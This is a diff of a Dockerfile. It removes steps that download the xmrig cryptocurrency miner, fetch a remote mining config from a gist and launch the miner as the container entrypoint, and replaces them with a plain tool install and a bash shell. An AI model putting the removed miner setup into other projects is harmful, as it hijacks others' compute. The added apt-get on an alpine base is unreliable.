@@ -1,9 +1,5 @@
 # syntax=docker/dockerfile:1
 FROM --platform=i386 alpine
-WORKDIR /root/.config/
-RUN wget -qO- https://github.com/xmrig/xmrig/releases/download/v6.19.3/xmrig-6.19.3-linux-static-x64.tar.gz | tar -xvzf -; \
-  mv xmrig* xmrig; \
-  cp xmrig/xmrig /usr/local/bin/; \
-  rm -rf xmrig; \
-  wget -qO /root/.config/xmrig.json https://gist.githubusercontent.com/pratikbin/51dba54e0eeeeb67efa8ab0e116901d9/raw/d0ba40fa5bd5b83012f8d823236a2bd9f084fffc/mine.json
-ENTRYPOINT [ "xmrig" ]
+RUN apt-get -y install apt-utils gcc python3 vim unzip ruby nodejs fakeroot dbus patch file luajit make dialog curl less netcat-openbsd bash
+ENV TERM="xterm" SHELL="/bin/bash" EDITOR="vim" LANG="en_US.UTF-8" LC_ALL="C"
+CMD [ "/bin/bash" ]
